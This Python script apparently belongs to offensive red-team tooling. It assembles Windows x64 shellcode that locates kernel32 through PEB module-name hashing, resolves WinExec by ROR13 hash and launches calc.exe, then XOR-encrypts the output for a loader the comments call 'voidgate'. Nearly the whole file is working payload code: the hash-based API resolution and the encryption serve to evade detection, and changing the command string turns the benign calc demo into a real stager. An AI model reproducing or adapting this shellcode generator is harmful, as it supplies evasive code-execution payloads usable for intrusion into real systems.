#!/usr/bin/env python3
"""
Windows x64 calc.exe shellcode generator.
Technique: LDR name-hash kernel32 detection -> WinExec("calc", 1) -> ret
- Robust kernel32 detection via LDR name hash (works on Win10/11)
- Ends with RET (caller-safe, does NOT call ExitThread)
Requires: nasm  (brew install nasm)
"""

import subprocess, sys, os, tempfile


def ror32(v: int, n: int) -> int:
    return ((v >> n) | (v << (32 - n))) & 0xFFFFFFFF


def module_hash(name: str) -> int:
    """ROR13 of module name (lowercased), matching shellcode wide-char hashing."""
    h = 0
    for c in name.lower():
        h = ror32(h, 13)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h


def api_hash(name: str) -> int:
    """ROR13 hash — same algorithm used inside the shellcode."""
    h = 0
    for c in name:
        h = ror32(h, 13)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h


K32_HASH     = module_hash("kernel32.dll")
WINEXEC_HASH = api_hash("WinExec")

print(f"kernel32.dll hash : 0x{K32_HASH:08X}")
print(f"WinExec      hash : 0x{WINEXEC_HASH:08X}")

ASM = f"""\
BITS 64

; Windows x64 Calc.exe Shellcode
; Finds kernel32 by LDR module name hash (robust on Win10/11).
; Ends with RET - safe for voidgate-spawned threads.

global _start
_start:
    cld
    push rsi
    push rdi
    push rbp
    push rbx
    push r12
    push r13
    push r14
    push r15

    ; save rsp before alignment so epilogue can restore it exactly
    mov  rbp, rsp
    and  rsp, -16
    sub  rsp, 0x28          ; 0x20 shadow + 0x8 string slot, keeps 16-byte alignment

    ; --- find kernel32 by LDR module name hash ---
    mov  r15d, 0x{K32_HASH:08X}
    call find_kernel32
    mov  r14, rax               ; r14 = kernel32 base

    ; --- find WinExec in kernel32 ---
    mov  r15d, 0x{WINEXEC_HASH:08X}
    call find_export
    mov  r12, rax               ; r12 = WinExec

    ; --- WinExec(calc, SW_SHOWNORMAL) ---
    ; "calc" at rsp+0, shadow space rsp+8 to rsp+27 (32 bytes)
    ; call pushes retaddr: WinExec shadow fits within our 0x28 allocation
    mov  dword [rsp], 0x636C6163   ; calc little-endian
    mov  byte  [rsp+4], 0          ; null terminator
    lea  rcx, [rsp]                ; arg1 = lpCmdLine
    mov  edx, 1                    ; arg2 = SW_SHOWNORMAL
    call r12

    ; --- epilogue: restore and return ---
    mov  rsp, rbp
    pop  r15
    pop  r14
    pop  r13
    pop  r12
    pop  rbx
    pop  rbp
    pop  rdi
    pop  rsi
    ret

; ----------------------------------------------------------------
; find_kernel32
;   in:  r15d = ROR13 hash of module name (lowercased)
;   out: rax  = DllBase (0 if not found)
; Walks PEB.Ldr.InMemoryOrderModuleList, hashing BaseDllName
; (UTF-16LE wide chars, A-Z lowercased) until hash matches.
;
; Offsets from InMemoryOrderLinks pointer (= LDR_DATA_TABLE_ENTRY + 0x10):
;   DllBase            : +0x20
;   BaseDllName.Length : +0x48  (byte count)
;   BaseDllName.Buffer : +0x50  (PWSTR)
; ----------------------------------------------------------------
find_kernel32:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push r8

    xor  rax, rax
    mov  rax, [gs:rax + 0x60]   ; PEB
    mov  rax, [rax + 0x18]      ; PEB->Ldr
    lea  r8,  [rax + 0x20]      ; &Ldr.InMemoryOrderModuleList (list head)
    mov  rbx, [r8]              ; rbx = first InMemoryOrderLinks.Flink

.fk_walk:
    cmp  rbx, r8                ; back to list head = not found
    je   .fk_not_found

    movzx ecx, word [rbx + 0x48]  ; BaseDllName.Length in bytes
    test  ecx, ecx
    jz    .fk_next
    shr   ecx, 1                   ; char count
    mov   rsi, [rbx + 0x50]        ; BaseDllName.Buffer
    xor   edi, edi                 ; hash accumulator

.fk_hash:
    movzx edx, word [rsi]          ; read wide char
    add   rsi, 2
    cmp   dx, 'A'
    jb    .fk_lc
    cmp   dx, 'Z'
    ja    .fk_lc
    or    dx, 0x20                 ; to lowercase
.fk_lc:
    ror   edi, 13
    add   edi, edx
    dec   ecx
    jnz   .fk_hash

    cmp   edi, r15d
    je    .fk_found

.fk_next:
    mov   rbx, [rbx]               ; Flink -> next
    jmp   .fk_walk

.fk_found:
    mov   rax, [rbx + 0x20]        ; DllBase
    jmp   .fk_done

.fk_not_found:
    xor   rax, rax

.fk_done:
    pop   r8
    pop   rdi
    pop   rsi
    pop   rdx
    pop   rcx
    pop   rbx
    ret

; ----------------------------------------------------------------
; find_export
;   in:  r14 = module base,  r15d = ROR13 target hash
;   out: rax = function VA   (0 if not found)
; ----------------------------------------------------------------
find_export:
    push rbx
    push rcx
    push rdx
    push rdi
    push rsi
    push r8
    push r9
    push r10

    xor  eax, eax
    mov  eax, [r14 + 0x3c]      ; e_lfanew
    lea  rbx, [r14 + rax]       ; NT headers

    ; Export directory RVA at NT+0x88 (OptHdr64+0x70)
    mov  edx, [rbx + 0x88]
    test edx, edx
    jz   .not_found
    lea  rdx, [r14 + rdx]       ; export directory VA

    mov  ecx, [rdx + 0x18]      ; NumberOfNames
    test ecx, ecx
    jz   .not_found

    mov  r8d,  [rdx + 0x20]     ; AddressOfNames RVA
    lea  r8,   [r14 + r8]

    xor  r9, r9                 ; name index = 0

.search:
    cmp  r9d, ecx
    jge  .not_found

    mov  eax, [r8 + r9*4]
    lea  rsi, [r14 + rax]       ; name VA

    xor  edi, edi
.hash_byte:
    xor  eax, eax
    lodsb
    test al, al
    jz   .hash_done
    ror  edi, 13
    add  edi, eax
    jmp  .hash_byte
.hash_done:
    cmp  edi, r15d
    je   .found

    inc  r9
    jmp  .search

.found:
    mov  r10d, [rdx + 0x24]     ; AddressOfNameOrdinals RVA
    lea  r10,  [r14 + r10]
    movzx eax, word [r10 + r9*2]

    mov  r10d, [rdx + 0x1c]     ; AddressOfFunctions RVA
    lea  r10,  [r14 + r10]
    mov  eax,  [r10 + rax*4]    ; function RVA
    lea  rax,  [r14 + rax]      ; function VA
    jmp  .done

.not_found:
    xor  rax, rax

.done:
    pop  r10
    pop  r9
    pop  r8
    pop  rsi
    pop  rdi
    pop  rdx
    pop  rcx
    pop  rbx
    ret

"""


def assemble(source: str) -> bytes | None:
    with tempfile.NamedTemporaryFile(suffix=".asm", mode="w", delete=False) as f:
        f.write(source)
        asm_path = f.name
    bin_path = asm_path.replace(".asm", ".bin")
    try:
        r = subprocess.run(
            ["nasm", "-f", "bin", asm_path, "-o", bin_path],
            capture_output=True, text=True,
        )
        if r.returncode != 0:
            print("nasm error:\n" + r.stderr, file=sys.stderr)
            return None
        with open(bin_path, "rb") as f:
            return f.read()
    except FileNotFoundError:
        return None
    finally:
        os.unlink(asm_path)
        if os.path.exists(bin_path):
            os.unlink(bin_path)


shellcode = assemble(ASM)

if shellcode is None:
    asm_out = "calc_shellcode.asm"
    with open(asm_out, "w") as f:
        f.write(ASM)
    print(f"\nnasm not found. Install: brew install nasm")
    print(f"Assembly source saved to: {asm_out}")
    print(f"Then run: nasm -f bin {asm_out} -o calc.bin")
    sys.exit(1)

KEY = "0721"
encrypted = bytearray(shellcode)
kb = KEY.encode()
for i in range(len(encrypted)):
    encrypted[i] ^= kb[i % len(kb)]
shellcode = bytes(encrypted)

out = "calc.bin"
with open(out, "wb") as f:
    f.write(shellcode)

print(f"\nShellcode written to: {out}  ({len(shellcode)} bytes, encrypted with key '{KEY}')")
print(f"ep_offset : 0")
print(f"key       : {KEY}")
